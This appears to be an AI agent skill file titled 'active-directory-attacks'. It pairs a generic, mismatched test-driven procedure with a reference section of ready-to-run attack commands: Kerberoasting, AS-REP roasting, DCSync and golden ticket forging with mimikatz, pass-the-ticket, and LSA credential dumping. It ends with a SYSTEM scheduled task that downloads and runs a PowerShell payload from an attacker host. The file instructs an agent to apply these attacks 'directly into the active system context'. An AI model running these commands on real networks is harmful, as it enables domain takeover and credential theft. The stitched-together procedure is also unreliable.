---
name: active-directory-attacks
description: Use when executing active directory attacks protocols within the security sector.
---

# Active Directory Attacks: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Active Directory Attacks. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core active directory attacks logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Active Directory Attacks

#### 1. Kerberoasting

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Using CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
```

#### 2. AS-REP Roasting

```powershell
.\Rubeus.exe asreproast
```

#### 3. Golden Ticket

```powershell
# DCSync to get krbtgt hash
mimikatz# lsadump::dcsync /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
```

#### 4. Pass-the-Ticket

```powershell
.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
klist  # Verify ticket
```

#### 5. Golden Ticket with Scheduled Tasks

```powershell
# 1. Elevate and dump credentials
mimikatz# token::elevate
mimikatz# vault::cred /patch
mimikatz# lsadump::lsa /patch

# 2. Create golden ticket
mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi

# 3. Create scheduled task
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
schtasks /run /s DOMAIN /TN "enterprise"
```

---